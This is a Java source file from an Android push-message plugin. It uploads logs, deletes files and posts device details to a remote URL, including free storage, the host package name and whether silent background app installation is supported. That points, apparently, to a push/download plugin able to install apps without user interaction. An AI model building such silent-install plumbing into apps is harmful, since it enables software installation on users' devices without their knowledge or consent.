package com.tiho.dlplugin.dao.impl;

import android.content.Context;

import com.tiho.base.base.http.HttpHelper;
import com.tiho.base.base.http.json.JsonUtil;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushRequestBodyBean;
import com.tiho.dlplugin.common.CommonInfo;
import com.tiho.dlplugin.display.PushStat;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.util.FileUtil;
import com.tiho.dlplugin.util.SilentInstall;
import com.tiho.dlplugin.util.StorageUtil;
import com.tiho.dlplugin.util.Urls;

import java.text.MessageFormat;

public class PushMessageWebRetrieve {

	protected Context context;

	public PushMessageWebRetrieve(Context c) {
		this.context = c;
	}
	
	
	protected String getUrl() {
		long maxId = PushStat.getInstance(context).getMaxId();

		LogManager.LogShow("the max push_id is " + maxId);

		String ver = CommonInfo.getInstance(context).getPluginVer();

		return MessageFormat.format(Urls.getInstance().getPushMessageUrl(), maxId, ver , PushStat.getInstance(context).getUpTime());
	}

	public String getPushMessage(boolean isSilent) throws Exception {
		try {
			LogUploadManager.getInstance(context).uploadRequestLog(isSilent);
		} catch (Exception e) {
			// TODO: handle exception
			LogManager.LogShow(e);
		}
		FileUtil.deleteSomeFileTask(context);
		String url = getUrl();
		
		String requestBody = JsonUtil.toJson(getReqBody());
		
		return HttpHelper.getInstance(context).simplePost(url, requestBody);
	}
	

	private PushRequestBodyBean getReqBody() {
		PushRequestBodyBean body = new PushRequestBodyBean();
		body.setAuto_install(SilentInstall.IsSupportBGInstall(context) == 0 ? 1 : 0);//1 表示支持静默安装
		body.setHost_pack(context.getPackageName());//宿主包名
		
		body.setFree_ram(StorageUtil.getAvailableInternalMemorySize());//获取手机内部剩余存储空间
		body.setFree_sd(StorageUtil.getAvailableExternalMemorySize());//获取SDCARD剩余存储空间

		return body;
	}

}
